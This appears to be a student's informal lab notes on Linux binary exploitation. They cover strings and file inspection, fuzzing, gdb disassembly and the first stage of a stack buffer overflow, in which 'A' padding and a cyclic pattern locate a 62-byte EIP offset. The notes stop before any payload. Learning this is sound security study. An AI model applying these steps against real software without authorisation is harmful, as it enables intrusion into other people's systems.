### Im kinda scared about these
```bash
### DEMO 1
1.) Static Analysis
strings <program> | head
file <program> # This will verify it is a linux program (ELF, also says /lib/ld-linux.so.2)
2.) Behavioral Analysis
chmod u+x func
./func to run it
3.) Dynamic Analysis
### Fuzzing
./func $(echo "12345678") #pass arguments 
./func <<<$(echo "12345678") #The gators are simulating user input
## Disassembly
gdb ./func
shell # Will take us back to our shell
exit # Will take us back to gdb from shell
quit # Break out of gdb

info functions # Look for the @ symbol, the names of functions are before the @
run OR start # Runs the program in gdb
disass or pdisass #Disassembles a function ex: "main" ##pdisass other functions
#FUNCTIONS IN RED HAVE A HIGHER CHANCE OF BEING VULNERABLE, DO OSINT ON THOSE IN RED
4.) CREATE script
#!/usr/bin/env python
offset = "A" * 100
print(offset)

5.)
run <<<$(echo "AAAAA") the output of () is going to be output to run
run <<<$(python linbuff.py) # This is going to apply A (x100) to the output of ./func
#pinpoint EIP go to wiremask
#copy paste pattern
#0x value net to eip goese back into wiremask
#we find an offset of 62
ex: New script:
#!/usr/bin/env python
offset = "A" * 62 (This was our value in offset on wiremask)
eip = "BBBB"
#offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A" (Commented out now)
print(offset+eip)
